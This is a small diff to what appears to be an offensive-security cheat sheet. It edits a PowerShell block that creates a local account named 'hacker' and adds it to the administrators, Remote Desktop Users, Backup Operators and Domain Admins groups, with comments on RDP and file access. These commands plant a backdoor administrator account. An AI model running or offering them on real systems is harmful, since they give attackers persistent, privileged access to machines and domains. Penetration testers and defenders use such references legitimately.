@@ -5,7 +5,8 @@
 ```powershell
 net user hacker hacker1234* /add
 net localgroup administrators hacker /add
-net localgroup "Remote Desktop Users" hacker /add
+net localgroup "Remote Desktop Users" hacker /add # RDP access
+net localgroup "Backup Operators" hacker /add # Full access to files
 net group "Domain Admins" hacker /add /domain
 ```
 
